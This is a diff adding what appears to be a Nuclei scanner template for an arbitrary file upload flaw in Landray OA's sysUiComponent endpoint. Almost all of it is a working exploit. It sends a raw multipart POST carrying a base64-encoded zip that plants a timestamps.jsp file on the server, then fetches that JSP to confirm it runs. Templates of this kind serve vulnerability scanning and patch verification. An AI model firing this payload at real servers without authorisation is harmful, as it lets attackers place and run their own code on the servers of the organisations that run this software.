@@ -1,0 +1,40 @@
+id: landary-oa-sysuicomponent-fileupload
+
+info:
+  name: 蓝凌OA sysUiComponent 任意文件上传
+  author: SleepingBag945
+  severity: critical
+
+
+variables:
+  boundary: "{{to_lower(rand_base(20))}}"
+  filename: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        
+        --{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.zip"
+        Content-Type: application/x-zip-compressed
+        
+        {{base64_decode("UEsDBBQAAAAIADsbfVddhQ1dHQAAABsAAAANAAAAY29tcG9uZW50LmluactMsTUyMDLmykvMTbUtycxNLS5JzC0o1ssqLgAAUEsDBBQAAAAIADsbfVe0QKhCYAAAAGgAAAAOAAAAdGltZXN0YW1wcy5qc3AdyDEOgzAMBdCrsCDFHSyljFQdO1dwAqt8UVdWkgYD129hfO/WNnl1LlWTWwrxGuOl6yL1CXvzkU1YMz/UEKQU05e45sQzfIDYU/wdKr4rFj9uRN0MfjYR8YS/EKhv7z9QSwECFAMUAAAACAA7G31XXYUNXR0AAAAbAAAADQAAAAAAAAAAAAAAgAEAAAAAY29tcG9uZW50LmluaVBLAQIUAxQAAAAIADsbfVe0QKhCYAAAAGgAAAAOAAAAAAAAAAAAAACAAUgAAAB0aW1lc3RhbXBzLmpzcFBLBQYAAAAAAgACAHcAAADUAAAAAAA=")}}
+        --{{boundary}}--
+        
+
+      - |
+        GET /resource/ui-component/2023/timestamps.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body_2,'400841')"
